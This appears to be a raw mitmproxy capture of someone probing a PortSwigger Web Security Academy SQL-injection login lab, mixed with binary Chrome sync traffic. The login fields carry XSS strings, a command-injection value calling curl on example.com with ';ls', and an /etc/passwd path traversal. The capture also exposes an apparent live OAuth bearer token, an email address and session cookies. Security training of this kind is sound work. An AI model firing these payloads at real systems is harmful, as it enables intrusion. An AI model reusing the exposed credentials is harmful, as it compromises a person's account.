\x00(\x00(\x94\x9b\x040\x008\xce\xbf\x8d\x07@\x01H\x9d\x8a\xe4lP\xc3\x8d\xe4lX\xb1\xdb\x88\xae\xbe\x93\xe1\x17`\xff\xff\xff\xff\xff\xff\xff\xff\xff\x01h\xb9\xd9\xeb\x8a\xbe\x93\xe1\x17p\xc8\x01z\x00\x80\x01\x02\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\x92\x01Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x98\x01\x00\xa0\x01\x00\xa8\x01\x00\xb0\x01\x00\xb8\x01\x00\xba\x01\x1c1Dbao6r4uH9xkrF0Cd3iYKxatFo=\n\xda\x04\n$0ed6ddb2-c6c4-4b30-8b9d-0e1f39d64df4 \x00(\xb4\xc9\xe8\x98\xaf20\xb4\xc9\xe8\x98\xaf2:`LcoRoaSjneqseoNT1RGQtw==-https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x90\x01\x00\xaa\x01\x9c\x03\x8a\xd9\xd6\x03\x96\x03\x08\x9b\x93\x96\xb5\xbe\x93\xe1\x17\x12\x18LcoRoaSjneqseoNT1RGQtw==\x1a\x82\x01\x08\x96\x9b\x04\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1a1SQL injection vulnerability allowing login bypass \x00"\n\x08\x07\x10\x00\x18\x00 \x00(\x00(\x95\x9b\x040\x008\x00@\x01H\x9d\x8a\xe4lP\xc3\x8d\xe4lX\x9b\x93\x96\xb5\xbe\x93\xe1\x17`\xff\xff\xff\xff\xff\xff\xff\xff\xff\x01h\xb1\xdb\x88\xae\xbe\x93\xe1\x17p\xf4\x03z\x00\x80\x01\x01\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\x92\x01Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x98\x01\x00\xa0\x01\x00\xa8\x01\x00\xb0\x01\x00\xb8\x01\x00\xba\x01\x1cmvK6qwgeYlMQTkq0Z4YU1PK2B9k=\x12\x18LcoRoaSjneqseoNT1RGQtw=="\xc2\x03\x08\x88\x81\x02\x08\xc6\xa6\x02\x08\xb1\xe6\x02\x08\xcf\xf3\x03\x08\xf1\xf7\x01\x08\xde\xd8\x12\x08\xc9\x95\x14\x08\xb9\xa1/\x08\xec\x8a?\x08\xfa\xc1\x02\x08\xf7\xf7\x02\x08\xa2\xb4\x05\x08\xc7\x87\x03\x08\xec\xf9\x02\x08\xe8\xa9\x06\x08\x9f\xef\x05\x08\xeb\x95\t\x08\x9a\xb7\t\x08\xe1\xfc\t\x08\x94\x8b\x19\x08\xa6\xe4\x1b\x08\xee\xf7!\x08\xfc\xde$\x08\xb4\xd2$\x08\xc9\x8b)\x08\xa2\xbe,\x08\x91\xeb:\x08\x8a\x91?\x08\xca\xaa=\x08\xab\xd26\x08\xaf\xd9E\x08\xc1\xdaE\x08\x81\xf5\x02\x18\x00 \x00*\x98\x01cBcQu6AlcCM:APA91bGGPN6yUwxvzgfNN4pVjvwpLLxIkSRxu6-M7dgJMosBU2yqlVdK8XyfFXHVovALPWJMYt_Y8uGQRErPMD7XmE0OmjoXx409NLSypcs_Totn_YXngEY_IQX9CW94zXty1LqgAP4D0\x00:\x98\x01cBcQu6AlcCM:APA91bGGPN6yUwxvzgfNN4pVjvwpLLxIkSRxu6-M7dgJMosBU2yqlVdK8XyfFXHVovALPWJMYt_Y8uGQRErPMD7XmE0OmjoXx409NLSypcs_Totn_YXngEY_IQX9CW94zXty1LqgAP4D@\x012\x80\x02fN&;*SNLn3EQuHtxn2JOmPK=zx,i6S8/dcp+.IGg-1tMD+r912muTQ]^%\\K LEA8$ y[;<s8IMW"!20G9xK`q9ehux\'"u 6X(&=zw4(_{/h/Ql@`W&HUXip7{t[ j3}}0=U$w8otZS% *E]PcL~2D,;0\'.6MyZI[nCB|U*r9}PYtvBbSBAU_L51dRM~RofI$TX@A]SeJ h65TtW$~V]Et2)tG*Tb\\Dd~bOqh*ZNI"Gy{WLg@WsbW4+=eqo*~T!wz:%z0000016c-34eb-7a90-0000-00005d3ca6c7R\x80\x01\n\x0c\x12\n8\x00@\x00R\x02\x10\x01`\x0c\n\x04\x18\xf1\xf7\x01\n\x04\x18\xc7\x87\x03\n\x04\x18\xc7\x87\x03\n\x04\x18\x91\xeb:\n\x04\x18\x91\xeb:\n\x04\x18\x91\xeb:\n\x04\x18\xc7\x87\x03\n\x04\x18\xc7\x87\x03\n\x04\x18\xc7\x87\x03\n\x04\x18\x91\xeb:\n\x04\x18\xf1\xf7\x01\n\x04\x18\xc7\x87\x03\n\x04\x18\x91\xeb:\n\x04\x18\x91\xeb:\n\x04\x18\x91\xeb:\n\x04\x18\xc7\x87\x03\n\x04\x18\x91\xeb:\n\x04\x18\xc7\x87\x03\x10\x01\x18\x00 \x00Z\x80\x01\n~\x12|Chrome WIN 130.0.6723.92 (ef4f16c57010eb3e047ef101019b869296173bd9-refs/branch-heads/6723@{#1518}) channel(stable),gzip(gfe)b\'AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgwj\x02\x10\x01'
+
+---
+
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 116
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=G3QwL5Jy6ynVB5wfAYLO4vjb2W4NzwrF
+priority: u=0, i
+
+Body:
+
+b'csrf=3AYPlnHO40l2JUujZGWKmtO89JbLrCYR&username=%3Cscript%3Ealert%28%27XSS_TEST%27%29%3C%2Falert%3E&password=test_xss'
+
+---
+
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 131
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=G3QwL5Jy6ynVB5wfAYLO4vjb2W4NzwrF
+priority: u=0, i
+
+Body:
+
+b'csrf=3AYPlnHO40l2JUujZGWKmtO89JbLrCYR&username=onmouseover%3D%22alert%28%27XSS%27%29&password=onmouseover%3D%22alert%28%27XSS%27%29'
+
+---
+
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 167
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=G3QwL5Jy6ynVB5wfAYLO4vjb2W4NzwrF
+priority: u=0, i
+
+Body:
+
+b'csrf=3AYPlnHO40l2JUujZGWKmtO89JbLrCYR&username=curl+%22http%3A%2F%2Fexample.com%3Fuser%3Dadmin%3Bls%22&password=curl+%22http%3A%2F%2Fexample.com%3Fuser%3Dadmin%3Bls%22'
+
+---
+---
+
+URL: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+Client Connection Details: {'Address': "('::1', 56051, 0, 0)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('0aa500830453a34280df0d5500f90007.web-security-academy.net', 443)", 'SNI': '0aa500830453a34280df0d5500f90007.web-security-academy.net', 'ALPN': b'h2', 'TLS Version': 'TLSv1.2'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 103
+cache-control: max-age=0
+sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+origin: https://0aa500830453a34280df0d5500f90007.web-security-academy.net
+content-type: application/x-www-form-urlencoded
+upgrade-insecure-requests: 1
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+sec-fetch-site: same-origin
+sec-fetch-mode: navigate
+sec-fetch-user: ?1
+sec-fetch-dest: document
+referer: https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+cookie: session=G3QwL5Jy6ynVB5wfAYLO4vjb2W4NzwrF
+priority: u=0, i
+
+Body:
+
+b'csrf=3AYPlnHO40l2JUujZGWKmtO89JbLrCYR&username=..%2F..%2Fetc%2Fpasswd+&password=..%2F..%2Fetc%2Fpasswd+'
+
+---
+
+URL: https://clients4.google.com/chrome-sync/command/?client=Google+Chrome&client_id=LcoRoaSjneqseoNT1RGQtw%3D%3D
+Client Connection Details: {'Address': "('::1', 56075, 0, 0)", 'SNI': 'clients4.google.com', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Server Connection Details: {'Address': "('clients4.google.com', 443)", 'SNI': 'clients4.google.com', 'ALPN': b'h2', 'TLS Version': 'TLSv1.3'}
+Method: POST HTTP/2.0
+Headers:
+content-length: 2069
+pragma: no-cache
+cache-control: no-cache
+authorization: Bearer ya29.a0AeDClZBEXRF5n3AfEZ1YsdYcMsy5TPqkzV9vN3bYzgdC71ioVPQFv3VUy5fKAN606S5gkJG4RZimKIIhcwY0IjtXnm2iDLT1xPt6FxH8lkNNDPkZzv9VYhEdEQXXB87Lidma5NLEKFyCGASzT8AfeG35_GOFMOKkk4GihWSmxSF8nls8R9SHPlo8yCiV27GYX45xz1ntqqEvnVXM0LykSqP0lV4lW3P1kcGqWKWasBd9nswOzYLByRlVZZMI0VviI_lISVqoEFSgNtW1BhwaCgYKARsSARASFQHGX2MijyX389PC1W-Unm-hrYyFzg0282
+content-encoding: gzip
+user-agent: Chrome WIN 130.0.6723.92 (ef4f16c57010eb3e047ef101019b869296173bd9-refs/branch-heads/6723@{#1518}) channel(stable)
+content-type: application/octet-stream
+x-client-data: CKy1yQEIjLbJAQimtskBCKmdygEImOvKAQiWocsBCPqYzQEIhaDNAQipns4BCP2lzgEI+r7OAQiSxs4BCJfLzgEIw8zOAQjGzM4BCNnMzgEIj83OARicsc4BGMO9zgEY/8nOAQ==
+sec-fetch-site: none
+sec-fetch-mode: no-cors
+sec-fetch-dest: empty
+accept-encoding: gzip, deflate, br, zstd
+accept-language: en-GB,en-US;q=0.9,en;q=0.8
+priority: u=4, i
+
+Body:
+
+b'\n\x14hiqahsh123@gmail.com\x10c\x18\x01"\xf3&\n\xa3\x01\n$3ea12704-ad7d-4123-8110-55906131b0e2 \x00(\x86\xd2\xef\x98\xaf20\x86\xd2\xef\x98\xaf2:\x1cusername|../../etc/passwd%20\x90\x01\x00\xaa\x01*\x8a\xbf\x0f&\n\x08username\x12\x11../../etc/passwd \x18\xc0\x80\x8d\xec\xbe\x93\xe1\x17\xba\x01\x1chM7ti8XNxBPUGP7KrGdtvk4zWH4=\n\xb7\x13\nfZ:ADqtAZzu3q0IH42snYfynELkIosH8CHdW/iGgqcnKuFNeqvN5b+uHI6EWus9wyLEzDGGMZZOc1x4fTwLqm5hreItpANhz3IUKg== \x90\x96\x88\xa5\xda\xc0\x89\x03(\x9a\xd5\xef\x98\xaf20\x8f\xb3\xca\x98\xaf2:\tHAIQAHASH\x90\x01\x00\xaa\x01\x87\x12\xba\xbc\x18\x82\x12\n\x18LcoRoaSjneqseoNT1RGQtw==\x1a\xe3\x11\x08\xc3\x8d\xe4l\x10\x9d\x8a\xe4l\x18\x00 \x06(\x002\x00:\xb5\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aBhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/"1SQL injection vulnerability allowing login bypass0\x00@\xa2\x06H\xa7\xbd\xe0\x98\xaf2P\x00X\x00`\x00x\xaf\xfd\xf7\xf5\xbd\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x02:\xd0\x02\x12]https://0aa500830453a34280df0d5500f90007.web-security-academy.net/my-account?id=administrator\x1aGhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login"1SQL injection vulnerability allowing login bypass0\x07@\xa7\x06H\xd8\xe6\xe2\x98\xaf2P\x00X\x00`\x00x\x91\xa4\x8b\x88\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x01:\xcb\x02\x12Bhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/\x1a]https://0aa500830453a34280df0d5500f90007.web-security-academy.net/my-account?id=administrator"1SQL injection vulnerability allowing login bypass0\x00@\xa9\x06H\xe0\x83\xe3\x98\xaf2P\x00X\x00`\x00x\xe6\xad\xee\x89\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x01:\xb5\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aBhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/"1SQL injection vulnerability allowing login bypass0\x00@\xab\x06H\xb4\xa4\xe5\x98\xaf2P\x01X\x00`\x00x\xb8\xb6\xbd\x9b\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x02:\xba\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aGhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login"1SQL injection vulnerability allowing login bypass0\x07@\xaf\x06H\xd8\xe7\xeb\x98\xaf2P\x01X\x00`\x00x\xbd\x89\xbb\xce\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x02:\xba\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aGhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login"1SQL injection vulnerability allowing login bypass0\x07@\xb5\x06H\xb0\xa7\xee\x98\xaf2P\x00X\x00`\x00x\x89\xd3\xfc\xe1\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x02:\xba\x02\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1aGhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login"1SQL injection vulnerability allowing login bypass0\x07@\xb7\x06H\x92\xd5\xef\x98\xaf2P\x00X\x00`\x00x\xb3\x99\xca\xec\xbe\x93\xe1\x17\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x06\xd0\x01\x02h\x01p\xb0\xf5\xe1\x98\xaf2 \x05\xba\x01\x1cV6rkYb+H7S2NMEx2jyAjOQNmKhg=\n\xf5\x02\nfZ:ADqtAZzu3q0IH42snYfynELkIosHjfJy861lPKTPX3lA0N/D3HtsiTD6kPSn7PEKER6Hty88Y46KhbLOBloG0lvzACl/7COERQ== \xec\xc4\xe8\xcf\xd9\xc0\x89\x03(\x94\xbf\xf0\x98\xaf20\xbd\xd7\x8a\x98\xaf2:\tHAIQAHASH\x90\x01\x00\xaa\x01\xc5\x01\xba\xbc\x18\xc0\x01\n\x18LcoRoaSjneqseoNT1RGQtw==\x1a\xa1\x01\x08\xd2\x8d\xe4l\x10\x9d\x8a\xe4l\x18\x00 \x00(\x002\x00:\x83\x01\x12\x1dhttp://127.0.0.1:8081/#/flows\x1a\x00"\tmitmproxy0\x06@\xa5\x06H\xae\xd9\xe1\x98\xaf2P\x00X\x00`\x00x\xc5\x96\xbb\xff\xbd\x93\xe1\x17\x8a\x01/http://127.0.0.1:8081/static/images/favicon.ico\xa0\x01\xc8\x01\xc8\x01\x01\xd0\x01\x01h\x01p\x94\xbf\xf0\x98\xaf2 \x01\xba\x01\x1cqvm9WDmA2zqEi0aVOpBuV5KNkg4=\n\xd8\x04\n$b398089a-db3c-46bf-a252-c7a49be454ff \x00(\x99\xd5\xef\x98\xaf20\x98\xd5\xef\x98\xaf2:`LcoRoaSjneqseoNT1RGQtw==-https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x90\x01\x00\xaa\x01\x9a\x03\x8a\xd9\xd6\x03\x94\x03\x08\xb3\x99\xca\xec\xbe\x93\xe1\x17\x12\x18LcoRoaSjneqseoNT1RGQtw==\x1a\x82\x01\x08\x9c\x9b\x04\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1a1SQL injection vulnerability allowing login bypass \x00"\n\x08\x07\x10\x00\x18\x00 \x00(\x00(\x9b\x9b\x040\x008\x00@\x01H\x9d\x8a\xe4lP\xc3\x8d\xe4lX\xb3\x99\xca\xec\xbe\x93\xe1\x17`\x9b\x93\x96\xb5\xbe\x93\xe1\x17h\x89\xd3\xfc\xe1\xbe\x93\xe1\x17p\xc8\x01z\x00\x80\x01\x02\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\x92\x01Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x98\x01\x00\xa0\x01\x00\xa8\x01\x00\xb0\x01\x00\xb8\x01\x00\xba\x01\x1cUxsUFn9kh1rtfPELPVpQB0vkcGo=\n\xdb\x04\n$024df4cc-b0a0-4a51-81c7-d427d6de3593 \x00(\x98\xd5\xef\x98\xaf20\x98\xd5\xef\x98\xaf2:`LcoRoaSjneqseoNT1RGQtw==-https://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x90\x01\x00\xaa\x01\x9d\x03\x8a\xd9\xd6\x03\x97\x03\x08\x89\xd3\xfc\xe1\xbe\x93\xe1\x17\x12\x18LcoRoaSjneqseoNT1RGQtw==\x1a\x82\x01\x08\x9b\x9b\x04\x12Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x1a1SQL injection vulnerability allowing login bypass \x00"\n\x08\x07\x10\x00\x18\x00 \x00(\x00(\x9a\x9b\x040\x008\x90\xcd\xcd\n@\x01H\x9d\x8a\xe4lP\xc3\x8d\xe4lX\x89\xd3\xfc\xe1\xbe\x93\xe1\x17`\x9b\x93\x96\xb5\xbe\x93\xe1\x17h\xb1\xdb\x88\xae\xbe\x93\xe1\x17p\xc8\x01z\x00\x80\x01\x02\x8a\x01Mhttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/favicon.ico\x92\x01Ghttps://0aa500830453a34280df0d5500f90007.web-security-academy.net/login\x98\x01\x00\xa0\x01\x00\xa8\x01\x00\xb0\x01\x00\xb8\x01\x00\xba\x01\x1cy7jRuLidPvZhsyNOK9i2YV2fexw=\x12\x18LcoRoaSjneqseoNT1RGQtw=="\xc2\x03\x08\x88\x81\x02\x08\xc6\xa6\x02\x08\xb1\xe6\x02\x08\xcf\xf3\x03\x08\xf1\xf7\x01\x08\xde\xd8\x12\x08\xc9\x95\x14\x08\xb9\xa1/\x08\xec\x8a?\x08\xfa\xc1\x02\x08\xf7\xf7\x02\x08\xa2\xb4\x05\x08\xc7\x87\x03\x08\xec\xf9\x02\x08\xe8\xa9\x06\x08\x9f\xef\x05\x08\xeb\x95\t\x08\x9a\xb7\t\x08\xe1\xfc\t\x08\x94\x8b\x19\x08\xa6\xe4\x1b\x08\xee\xf7!\x08\xfc\xde$\x08\xb4\xd2$\x08\xc9\x8b)\x08\xa2\xbe,\x08\x91\xeb:\x08\x8a\x91?\x08\xca\xaa=\x08\xab\xd26\x08\xaf\xd9E\x08\xc1\xdaE\x08\x81\xf5\x02\x18\x00 \x00*\x98\x01cBcQu6AlcCM:APA91bGGPN6yUwxvzgfNN4pVjvwpLLxIkSRxu6-M7dgJMosBU2yqlVdK8XyfFXHVovALPWJMYt_Y8uGQRErPMD7XmE0OmjoXx409NLSypcs_Totn_YXngEY_IQX9CW94zXty1LqgAP4D0\x00:\x98\x01cBcQu6AlcCM:APA91bGGPN6yUwxvzgfNN4pVjvwpLLxIkSRxu6-M7dgJMosBU2yqlVdK8XyfFXHVovALPWJMYt_Y8uGQRErPMD7XmE0OmjoXx409NLSypcs_Totn_YXngEY_IQX9CW94zXty1LqgAP4D@\x012\x80\x02GlWZF^\'E)X %@o\'LjLf&LhZmqH~H6 b9BhS9T;6sE>Qs}ag\'$p| "UwD/V?#9UX53l3Tr,e-r5@2%8G{B/Un)Zm{\\:UH@C*8FBB@t=`%?_@"iJ1E_xs@Dn,Gw6GB|z5po=I}~l0(?wjA`4AH)Zmy<I-4li][#(qW4J2D\\k2Rf_ o& }@T5iQ[b]vu6;D<B9b\'cFC#C  f3iUgHY\'& 2buvfgE]k)L7xIH{1a]2U z[YA19%-\',3FdoW}k)JmzL<?:%z0000016c-34eb-7a90-0000-00005d3ca6c7RP\n\x0c\x12\n8\x00@\x00R\x02\x10\x01`\x0c\n\x04\x18\xf1\xf7\x01\n\x04\x18\xc7\x87\x03\n\x04\x18\x91\xeb:\n\x04\x18\x91\xeb:\n\x04\x18\x91\xeb:\n\x04\x18\xc7\x87\x03\n\x04\x18\xc7\x87\x03\n\x04\x18\x91\xeb:\n\x04\x18\xc7\x87\x03\n\x04\x18\xc7\x87\x03\x10\x01\x18\x00 \x00Z\x80\x01\n~\x12|Chrome WIN 130.0.6723.92 (ef4f16c57010eb3e047ef101019b869296173bd9-refs/branch-heads/6723@{#1518}) channel(stable),gzip(gfe)b\'AIzaSyBOti4mM-6x9WDnZIjIeyEU21OpBXqWBgwj\x02\x10\x01'
+
+---
+
+
